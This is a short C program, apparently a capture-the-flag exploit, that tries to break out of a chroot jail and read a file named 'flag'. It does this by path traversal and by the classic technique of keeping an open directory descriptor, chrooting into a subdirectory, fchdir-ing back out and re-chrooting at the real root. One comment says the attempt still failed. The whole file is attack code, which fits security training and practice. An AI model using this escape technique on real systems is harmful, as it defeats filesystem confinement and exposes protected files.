# include <unistd.h>
# include <stdio.h>
# include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
//gcc -o exploit ./exploit.c -masm=intel -no-pie -static
void catflag(char * flag)
{
    FILE * f = fopen(flag, "r");
    char buf[20] = {0};
    fread(buf, 1, 20, f);
    fclose(f);
    puts(buf);
    return;
}

void chrootsubdir()
{
    mkdir("subDir", 0);
    chmod("subDir", 0777);
    chroot("subDir");
    return;

}
int main()
{
    catflag("../../../../../../../../flag");
    chdir("/");
    catflag("../../../../flag");
    int fd = open(".", O_RDWR);
    chrootsubdir(); //chroot may change cwd to chrooted
    //still failed....
    fchdir(fd);
    chdir("../../../../../../../../");
    chroot(".");
    catflag("./flag");
    return 0;
}